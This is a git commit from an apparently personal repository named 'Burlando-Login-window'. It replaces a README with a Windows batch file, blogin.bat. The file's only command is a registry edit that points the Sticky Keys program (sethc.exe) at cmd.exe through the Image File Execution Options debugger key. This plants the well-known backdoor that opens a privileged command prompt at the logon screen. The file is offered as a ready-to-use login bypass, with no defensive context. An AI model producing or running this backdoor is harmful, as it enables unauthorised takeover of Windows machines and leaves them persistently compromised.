9ae38e58cd4e4f63c54b1a5a7e57d4edc9bda567
d04g145 <tec_suportes@hotmail.com>
2019-03-23 10:48:12 -0300

    Update and rename README.md to blogin.bat

--- README.md
+++
@@ -1,1 +0,0 @@
-# Burlando-Login-window
---
+++ blogin.bat
@@ -0,0 +1,3 @@
+# Burlando-Login-window
+@echo off
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
